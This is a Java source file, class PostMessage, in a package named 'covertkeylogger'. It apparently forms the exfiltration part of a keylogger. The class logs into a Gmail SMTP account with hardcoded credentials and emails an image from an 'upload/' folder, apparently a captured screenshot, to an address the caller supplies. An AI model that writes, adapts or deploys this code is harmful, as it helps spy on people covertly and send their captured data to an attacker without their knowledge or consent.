package covertkeylogger;

import java.io.File;
import java.util.Properties;
 
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
 
public class PostMessage {
 
	public static void post(String postEmail, String image) {
 
		final String username = "cklhaxsaw@gmail.com";
		final String password = "badpassword1";
 
		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
 
		Session session = Session.getInstance(props,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
			}
		  });
 
		try {

		    // create a message
		    MimeMessage msg = new MimeMessage(session);
		    msg.setFrom(new InternetAddress("cklhaxsaw@gmail.com"));
		    msg.setRecipients(Message.RecipientType.TO,
					InternetAddress.parse(postEmail));
		    msg.setSubject("Post");
		    
		    // create and fill the first message part
		    MimeBodyPart mbp1 = new MimeBodyPart();
		    mbp1.setContent("<p><img style='float:right' src='cid:image_cid'>An image...</p>", "text/html");

		    // create the second message part
		    MimeBodyPart mbp2 = new MimeBodyPart();
		    // attach the file to the message
		        DataSource source = new FileDataSource(new File("upload/" + image));
		        mbp2.setDataHandler(new DataHandler(source));
		        mbp2.setFileName(image);
		        mbp2.setHeader("Content-ID", "<image_cid>"); // cid:image_cid
		        mbp2.setHeader("Content-Type", "image/png; name=\"" + image + "\"");
		        mbp2.setHeader("X-Attachment-Id", "image_cid");
		    // create the Multipart and add its parts to it
		    Multipart mp = new MimeMultipart();
		    mp.addBodyPart(mbp1);
		    mp.addBodyPart(mbp2);
		    // add the Multipart to the message
		    msg.setContent(mp);
		    // send the message
		    Transport.send(msg);

			System.out.println("Uploaded new image:" + image);
 
		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}
	}
}
